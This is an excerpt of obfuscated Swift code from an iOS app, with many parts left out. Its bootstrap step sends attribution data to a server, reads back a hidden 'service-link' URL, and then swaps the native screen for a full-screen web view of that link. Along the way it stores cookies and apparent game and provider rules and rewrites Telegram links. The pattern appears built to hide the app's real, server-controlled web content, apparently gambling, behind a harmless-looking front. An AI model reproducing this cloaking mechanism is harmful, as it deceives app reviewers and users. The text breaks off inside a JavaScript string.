...
private extension Notification.Name {
    static let n2 = Notification.Name("n.c.e2")
}

private enum S1 {
    static let rk = "reason"
}
...
private final class M0: ObservableObject {
    ...
    @MainActor
    func start() {
        let pendingPushID = (UserDefaults.standard.string(forKey: "k_p0") ?? "")
            .trimmingCharacters(in: .whitespacesAndNewlines)
        if didMakeA0, pendingPushID.isEmpty {
    ...
    @MainActor
    func dropA0(reason: String) {
        if dropClearA0(reason: reason) {
            UserDefaults.standard.removeObject(forKey: "k_t0")
        }
        phase = .native
    }
    ...
    private func bootstrap(trigger: String) async {
        ...
        do {
            ...
            if let httpResponse = response as? HTTPURLResponse, !(200...299).contains(httpResponse.statusCode) {
                print("z bootstrap bad status=\(httpResponse.statusCode)")
                await MainActor.run { self.phase = .native }
                return
            }
            ...
            if let taskLink = normU(decoded.response) {
                ...
                if !pushID.isEmpty {
                    await MainActor.run { self.lastB1 = pushID }
                }
                if !pushID.isEmpty {
            ...
            print("z bootstrap error=\(error.localizedDescription)")
            await MainActor.run { self.phase = .native }
        }
    }
    ...
    private func waitForAdjustAttribution(upToSeconds seconds: Int) async -> [String: Any] {
        for _ in 0..<seconds {
            if let jsonString = UserDefaults.standard.string(forKey: "k_adj_attr"),
               !jsonString.isEmpty,
        ...
        guard let jsonString = UserDefaults.standard.string(forKey: "k_adj_attr"),
    ...
    private func prepA1(clientUUID: String) async {
        ...
        if let normalized = normU(serviceLink) {
            UserDefaults.standard.set(normalized, forKey: "k_l0")
        }
    }
    ...
    private func pickU(from response: HTTPURLResponse, bodyData: Data) -> String? {
        if let headerValue = normU(response.value(forHTTPHeaderField: "service-link")) {
            return headerValue
        }
        ...
        for (key, value) in response.allHeaderFields {
            ...
            if let fromHeader = normU(String(describing: value)) {
                return fromHeader
            }
        }

        return pickUFromBody(bodyData)
    }

    private func pickUFromBody(_ data: Data) -> String? {
        if let jsonObject = try? JSONSerialization.jsonObject(with: data),
           let extracted = pickU3(from: jsonObject),
           let normalized = normU(extracted) {
            return normalized
        }

        if let text = String(data: data, encoding: .utf8),
           let normalized = normU(text) {
            return normalized
        }
    ...
    private func pickU3(from object: Any) -> String? {
        ...
        if let dictionary = object as? [String: Any] {
            for (key, value) in dictionary {
                ...
                if preferredKeys.contains(normalizedKey),
                   ...
                   normU(valueString) != nil {
                    return valueString
                }
            }

            for value in dictionary.values {
                if let nested = pickU3(from: value) {
                    return nested
                }
            }
        ...
        } else if let text = object as? String, normU(text) != nil {
            return text
        }
...
struct R0View: View {
    @StateObject private var m0 = M0()
    @State private var didStartBootstrap = false

    private let e0 = NotificationCenter.default.publisher(
        for: NSNotification.Name("e0")
    )

    private let e2 = NotificationCenter.default.publisher(
        for: .n2
    )
    ...
    var body: some View {
        Group {
            ...
            case .native:
                ContentView()
            case .web(let taskLink):
                H0View(taskLink: taskLink)
                    .ignoresSafeArea()
            }
        }
        .onAppear {
        ...
        .onReceive(e0) { _ in
            m0.kickA0(trigger: "tokenReceived")
        }
        .onReceive(e2) { note in
            let reason = note.userInfo?[S1.rk] as? String ?? "unknown"
            m0.dropA0(reason: reason)
        }
    }
}

private struct L0View: View {
    var body: some View {
        ZStack {
            LinearGradient(
                colors: [
                    Color(red: 15 / 255, green: 19 / 255, blue: 44 / 255),
                    Color(red: 24 / 255, green: 35 / 255, blue: 78 / 255),
                    Color(red: 11 / 255, green: 13 / 255, blue: 33 / 255)
                ],
...
private struct H0View: UIViewControllerRepresentable {
    let taskLink: String

    func makeUIViewController(context: Context) -> C0Host {
        let controller = C0Host()
        controller.taskLink = taskLink
        return controller
    }

    func updateUIViewController(_ uiViewController: C0Host, context: Context) {
        uiViewController.taskLink = taskLink
        uiViewController.v9()
    }
}

private final class C0Host: UIViewController, WKNavigationDelegate, WKUIDelegate, WKScriptMessageHandler {
    var taskLink: String = ""
    ...
    override func viewDidLoad() {
        ...
        Z9Bridge.zMask = .allButUpsideDown
    ...
    func v9() {
        ...
        let sanitizedURL = Self.u0(rawURL)
        let sanitizedTaskLink = sanitizedURL.absoluteString
        UserDefaults.standard.set(sanitizedTaskLink, forKey: "k_t0")
        ...
        v7()
        v5(sanitizedURL, reason: "initial", resetRetries: true)
    }
    ...
    private func v5(_ url: URL, reason: String, resetRetries: Bool) {
        guard let webView else { return }
        if resetRetries {
            mainLoadRetryCount = 0
        }
        lastMainURL = url
        print("z v5 reason=\(reason) url=\(url.absoluteString)")
        webView.load(URLRequest(url: url))
    }

    private static func u0(_ url: URL) -> URL {
        ...
        if let capturedValue,
           let parsedRule = u1(capturedValue) {
            let serializedRule = "\(parsedRule.gameId)___\(parsedRule.provider)"
            UserDefaults.standard.set(serializedRule, forKey: "k_g0")
            print("z changetop rule saved=\(serializedRule)")
        }
    ...
    private static func u1(_ rawValue: String) -> (gameId: String, provider: String)? {
    ...
    private static func u2() -> (gameId: String, provider: String)? {
        guard let raw = UserDefaults.standard.string(forKey: "k_g0") else { return nil }
        return u1(raw)
    }

    private func v7() {
        guard let cookieData = UserDefaults.standard.object(forKey: "k_ck") as? Data else { return }
        do {
            ...
            print("z v7 error=\(error.localizedDescription)")
            UserDefaults.standard.removeObject(forKey: "k_ck")
        }
    }
    ...
    private func v8() {
        ...
        do {
            ...
            UserDefaults.standard.set(encoded, forKey: "k_ck")
        } catch {
            print("z v8 error=\(error.localizedDescription)")
        }
    }

    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        guard message.name == "lmLogger" else { return }
        print("z JS:", String(describing: message.body))
    }
    ...
    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        v1(error, for: webView, stage: "didFail")
    }

    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        v1(error, for: webView, stage: "didFailProvisional")
    }
    ...
    func webViewWebContentProcessDidTerminate(_ webView: WKWebView) {
        ...
        guard contentProcessTerminateRetryCount < maxContentProcessTerminateRetries else {
            v0(reason: "content-process-terminated", for: webView)
            return
        }
        contentProcessTerminateRetryCount += 1
        if let mainURL = lastMainURL {
            v5(mainURL, reason: "content-process-retry-\(contentProcessTerminateRetryCount)", resetRetries: false)
        } else {
            webView.reload()
        }
    }
    ...
    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        if let requestURL = navigationAction.request.url,
           let rewrittenURL = u3(from: requestURL) {
            if let currentURL = webView.url,
               u4(currentURL) == u4(rewrittenURL) {
                decisionHandler(.cancel)
                return
            }
            if webView === self.webView {
                v5(rewrittenURL, reason: "telegram-rewrite-nav-action", resetRetries: false)
            } else {
    ...
    func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        if let response = navigationResponse.response as? HTTPURLResponse {
            ...
            if status >= 400, navigationResponse.isForMainFrame {
                if u8(status) {
                    v0(reason: "http-\(status)", for: webView)
                } else {
                    print("z keep main frame for recoverable status=\(status)")
                }
    ...
    private func v1(_ error: Error, for webView: WKWebView, stage: String) {
        let nsError = error as NSError
        if v3(nsError) {
            return
        }
        ...
        if webView === self.webView, u7(after: nsError, stage: stage) {
            return
        }
        v0(reason: "\(stage)-\(nsError.domain)-\(nsError.code)", for: webView)
    }

    private func v2(_ error: NSError, webView: WKWebView, stage: String) -> Bool {
        guard error.domain == NSURLErrorDomain, error.code == NSURLErrorUnsupportedURL else {
            return false
        }

        if let failedURL = u5(from: error, webView: webView),
           let rewrittenURL = u3(from: failedURL) {
            if let currentURL = webView.url,
               u4(currentURL) == u4(rewrittenURL) {
                return true
            }
            print("z \(stage) telegram rewrite from=\(failedURL.absoluteString) to=\(rewrittenURL.absoluteString)")
            if webView === self.webView {
                v5(rewrittenURL, reason: "telegram-rewrite-\(stage)", resetRetries: false)
            } else {
                webView.load(URLRequest(url: rewrittenURL))
            }
            return true
        ...
        if let failedURL = u5(from: error, webView: webView),
           ...
           scheme != "http", scheme != "https" {
            ...
            print("z \(stage) opened external unsupported url=\(failedURL.absoluteString)")
            return true
        }

        print("z \(stage) suppressed unsupported URL")
        return true
    }

    private func v3(_ error: NSError) -> Bool {
    ...
    private func v4(_ host: String?) -> Bool {
        guard let host = host?.lowercased() else { return false }
        return host == "t.me" || host == "telegram.me"
    }

    private func u3(from url: URL) -> URL? {
        let scheme = url.scheme?.lowercased() ?? ""

        if scheme == "http" || scheme == "https" {
            guard v4(url.host) else { return nil }
    ...
    private func u4(_ url: URL) -> String {
        var components = URLComponents(url: url, resolvingAgainstBaseURL: false)
    ...
    private func u5(from error: NSError, webView: WKWebView) -> URL? {
    ...
    private func u6(for error: NSError) -> Bool {
    ...
    private func u7(after error: NSError, stage: String) -> Bool {
        guard u6(for: error), mainLoadRetryCount < maxMainLoadRetries else {
            return false
        }
        ...
        print("z \(stage) retry attempt=\(attempt)/\(maxMainLoadRetries) url=\(mainURL.absoluteString)")
        DispatchQueue.main.asyncAfter(deadline: .now() + delaySeconds) { [weak self] in
            guard let self, !self.didTriggerFallback else { return }
            self.v5(mainURL, reason: "retry-\(attempt)-\(stage)", resetRetries: false)
        }
        return true
    }

    private func u8(_ status: Int) -> Bool {
    ...
    private func u9(_ webView: WKWebView) {
        guard webView === popupWebView else { return }
        webView.removeFromSuperview()
        popupWebView = nil
    }

    private func v0(reason: String, for webView: WKWebView?) {
    ...
    static func j0() -> String {
        guard let rule = u2() else {
            return """
(function() {
